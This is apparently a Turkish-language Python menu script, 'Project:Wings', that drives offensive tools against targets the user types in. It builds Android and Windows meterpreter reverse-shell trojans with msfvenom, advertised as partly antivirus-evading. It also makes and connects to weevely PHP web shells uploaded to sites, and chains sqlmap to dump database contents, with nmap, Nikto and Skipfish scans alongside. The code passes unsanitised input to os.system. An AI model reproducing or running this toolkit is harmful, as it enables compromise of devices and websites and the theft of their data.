import os 
	
import time
	
import sys
	


import os

import sys

import time
try:
	os.system("figlet Project:Wings")
	
	def netdiscover():
		os.system("clear")	
		os.system("figlet NETDISCOVER")
		print("Netdiscovera Hoşgeldiniz :)")
		time.sleep(7)
		os.system("netdiscover")
	
	def nikto():
		os.system("clear")
		os.system("figlet Nikto Scanner")
		print("Nikto Web Açık Tarayıcısına Hoşgeldiniz:)")
		time.sleep(3)
		ip = input("Hedef Ip Adresini Veya Host Adresini Gir : ")
		os.system("nikto -h " + ip + " -e 3")
	
	
	
	def trojan():
	
		os.system("clear")
		os.system("figlet Trojan Olusturucu")
		print("Trojan Oluşturucuya Hoşgeldiniz:)")
		print("""
		Payloadlar ;
	
		1)Telefonlar İçin
		2)Windows İçin
	
		
	
	
		""")
	
		secim = int(input("Seçiminizi Yapın : "))
		lhost = input("IP Adresinizi Girin : ")
		lport = input("Portu Girin (443) : ")
		if secim == 1:
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw -e generic/none -i 1 -o /root/Masaüstü/trojen.apk")
			print("Trojan /root/Masaüstü/trojen.apk Yoluna Oluşturuldu.")
		
		if secim == 2:
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -e generic/none -i 1 -o /root/Masaüstü/trojen.exe")	
			print("Trojan /root/Masaüstü/trojen.exe Yoluna Oluşturuldu.")
	def rootkit():
		os.system("clear")
		os.system("figlet ROOTKIT SCANNER")
		soru = input("Rootkit Taraması Yapmak İster Misiniz ? (e/h) : ")
		if soru == "e":
			os.system("chkrootkit")
		elif soru == "h":
			print("Pekala :)")
	def weevely():
		

		os.system("clear")
		
		os.system("figlet UV BY OXYDES")
	
	
		while True:
			
		
			soru = input("Upload Dosyası Üretilsin Mi? (e/h) (çıkmak için q) : ")
			
			if soru == "e":
				sifre = input("Dosyaya Erişmek İçin Bir Şifre Girin : ")
				print("Dosya Üretiliyor...")
				time.sleep(2)
				os.system("weevely generate " + sifre + " /root/Masaüstü/php_dosyasi.php")
				print("Dosya /root/Masaüstü/php_dosyasi.php Yoluna Oluşturuldu...")
				secim = input("Dosya Dinlemeye Alınsın Mı (lütfen dosyayı siteye yükledikten sonra burayı cevaplayın(e/h çıkmak için q)) : ")
				if secim == "e":
					url = input("Dosyayı Yüklediğiniz Adresi Girin : ")
					print("3 Saniye Sonra Bağlantı Kurulmaya Çalışılacak...")
					time.sleep(3)
					os.system("weevely " + url + " " + sifre)
				elif secim == "h":
					print("Uygulamadan Çıkılıyor...")
					False
				elif secim =="q":
					sys.exit()
			elif soru == "h":
				print("Uygulamadan Çıkılıyor...")
				False
			elif soru == "q":
				sys.exit()
	def skipfish():

		os.system("clear")
		
		os.system("figlet SKIPFISH")

		print("LÜTFEN URLYI https://site.com/ OLARAK GİRİN")

		print("Skipfish Sistemlerde Açık Tarayan İleri Düzey Bir Uygulamadır.")

		while True:
			secim = input("Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
			if secim == "e":
				url = input("Hedef Site Url Adresi Girin : ")
				print("3 Saniye Sonra Tarama Başlatılacak...")
				time.sleep(3)	
				os.system("skipfish -o /root/Masaüstü/sonuclar " + url)
				print("Sonuçlar /root/Masaüstü/sonuclar/index.html Yoluna Kaydedildi")
			

			elif secim == "h":
				print("Pekala:)")
				False
			elif secim == "q":
				print("Görüşmek Üzere :)")
				sys.exit()
			else:
				print("Beklenmeyen Hata:(")


	def nmap():
		os.system("clear")
		os.system("figlet PORT SCANNER")
		print("Port Scannera Hoşgeldiniz Nmap Kullanılarak Yapılmıştır...")
		while True:	
			soru = input("Devam Etmek İster Misiniz? (e/h) : ")
			if soru == "e":
						
				print("""
				1)Hızlı Tarama
				2)Firewall Taraması
				3)İşletim Sistemi Taraması
				4)SYN Taraması
				5)Versiyon Taraması
				6)SYN + Versiyon
				7)Hepsi Bir Arada Tarama

				""")
				secim = int(input("Seçiminizi Girin : "))
				ip = input("Hedef Host Veya Ip Adresi : ")
				if secim == 1:
					os.system("nmap " + ip)
				elif secim == 2:
					os.system("nmap -sA " + ip)
				elif secim == 3:
					os.system("nmap -O " + ip)
				elif secim == 4:
					os.system("nmap -sS " + ip)
				elif secim == 5:
					os.system("nmap -sV " + ip)
				elif secim == 6:
					os.system("nmap -sS -sV " + ip)
				elif secim == 7:
					os.system("nmap -A -O -sS -sV " + ip)
							
				else:
					print("Hatalı Giriş")

			elif soru == "h":
				print("Görüşürüz :)")
				sys.exit()
	def sqlmap():
		

		os.system("figlet SQLMAP")
			

		print("Uygulama 3 Saniye Sonra Başlatılacak...")
		time.sleep(3)
		while True:
			soru = input("SQLMAP Başlatıldı Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
			if soru == "e":
				url = input("Açıklı Url'yi Girin : ")
				os.system("sqlmap -u " + url + " --dbs")
				sual = input("Databaseler Göründüyse e Tuşlayın(gözükmediyse açık yoktur...)")
				if sual == "e":
					database = input("Database Adını Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " --tables")
					tables = input("Table Adını Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " -T " + tables + " --columns")
					column = input("Column Adı Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " -T " + tables + " -C " + column + " --dump")
					print("İşlem Bitti Hoşçakal...")
					sys.exit()
			elif soru == "h":
				print("Peki:)")
				False
			elif soru == "q":
				print("Görüşürüz...")
				sys.exit()




	print("""
	1)Netdiscover
	2)Web Sitesi Zaafiyet Taraması
	3)Trojan Oluşturucu(%30 fud)
	4)Rootkit Scanner
	5)File Upload Açığı İstismar Edici
	6)Skipfish Web Güvenlik Tarayıcı
	7)Port Tarayıcı	
	8)SQLMAP
	99)Çıkış
	""")
	secim = int(input("Seçiminizi Girin : "))
	
	if secim == 1:
		netdiscover()
	elif secim == 2:
		nikto()
	elif secim == 3:
		trojan()
	elif secim == 4:
		rootkit()
	elif secim == 5:
		weevely()
	elif secim == 6:
		skipfish()
	elif secim == 7:
		nmap()
	elif secim == 8:
		sqlmap()
	elif secim == 99:
		print("Görüşmek Üzere")
		sys.exit()
	else:
		print("Hatalı Giriş Yaptınız ...")
except KeyboardInterrupt:
	print("Hoşçakal:)")
